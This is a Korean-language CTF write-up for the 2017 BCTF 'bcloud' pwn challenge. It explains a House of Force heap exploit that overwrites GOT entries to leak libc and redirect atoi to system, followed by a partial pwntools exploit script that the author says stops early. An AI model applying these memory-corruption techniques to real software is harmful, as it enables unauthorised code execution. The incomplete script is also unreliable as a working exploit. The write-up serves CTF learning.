# 2017 bctf - [PWN] bcloud

## Key words

- i386 | NX
- heap (House of force)
- leak by got overwritten

## Solution

처음에 이름을 입력 받는 부분에서 힙 주소를 노출 시킬 수 있습니다.

그 이후, Host 와 Org를 입력 받는데 스트링을 복사 할 때, 오버플로우가 발생하여 힙의 top chunk (wilderness)를 수정할 수 있습니다.

top chunk의 크기를 0xffffffff로 변경하면 매우 큰 크기의 malloc이 가능하고 이는 32비트 주소 체계를 넘게 되서 다시 처음으로 돌게 할 수 있습니다.

따라서 malloc으로 내가 원하는 위치에 할당을 하기 위해 다음과 같이 계산 할 수 있습니다.

```
양수 계산: target - heap_addr - 8
음수 계산: (target - heap_addr) ^ 0xffffffff + 1
```

이를 이용하여 `bss` 영역부터 원하는 값을 쓸수가 있어 문제에서 제공하는 특정 배열을 조작할 수 있습니다.

문제는 기본적인 기능으로는 주소 노출을 할 수가 없는데, free@got를 puts@got로 변경하여 노출 시킬 수 있습니다.

노출된 주소를 이용하여 system 주소를 구하고, atoi@got 를 system 주소로 변경한 뒤, 메뉴 입력 시 `/bin/sh\x00`을 넣어 주면 쉘이 떨어 지게 됩니다.

> 익스 코드는 house of force를 이용하여 bss영역을 덮어 써서 got까지 덮어 쓴 내용이고 그 이후에는 개인 적인 환경에서 정상적으로 동작하지 않아 생략했습니다. 그러나 bss를 이용하여 got를 덮어 쓰는 곳 이후로는 별 다른 어려움이 없기 때문에 문제 해결에는 지장이 없습니다.

## Exploit Code

```python
from pwn import *
context(arch='amd64', os='linux')

target = "./bcloud"
p = process(target)
e = ELF(target)

def fn_leak(addr, n, title=""):
	print " *** {} : {} *** """.format(title, hex(addr))
	print hexdump(p.leak(addr, n))

print p.recv()
p.send("A"*0x3f + "Z")
data = p.recv()
data = data.split("Z")[1].split("!")[0]
heap_addr = u32(data)

print "heap addr : {}".format(hex(heap_addr))
print hexdump(p.leak(heap_addr-8, 0x100))

p.send("A"*0x40)
p.sendline("\xff"*4)
print p.recv()
print hexdump(p.leak(heap_addr-8, 0x100))

arr_N = 0x0804b0a0-0x8
got_addr = 0x0804b000
arr_list = 0x0804b120

# size = target - top_chunk - 8
size = (arr_N - (heap_addr-8+0xdc) - 8) & 0xffffffff
size = (0xffffffff ^ size) + 1
print hex(size)

p.sendline("1")
print p.recv()

p.sendline("-" + str(size))
print p.recv()

p.sendline("1")
print p.recv()

payload = ""
payload += p32(32) * 10
payload += p32(0) * 19
payload += p32(0) * 3
payload += p32(e.got['free'])
payload += p32(e.got['__libc_start_main'])
payload += p32(0)*9

print len(payload)
p.sendline(str(len(payload)+1))
print p.recv()

p.sendline(payload)
print p.recv()

fn_leak(arr_N, 0x50, "arr_N")
fn_leak(arr_list, 0x30, "arr_list")
fn_leak(got_addr, 0x30, "got_addr")

p.sendline("3")
print p.recv()
p.sendline("0")
print p.recv()
p.sendline(p32(e.got['puts']))
print p.recv()

fn_leak(arr_N, 0x50, "arr_N")
fn_leak(arr_list, 0x30, "arr_list")
fn_leak(got_addr, 0x30, "got_addr")

p.sendline("4")
print p.recv()
p.sendline("1")
print p.recv()
```
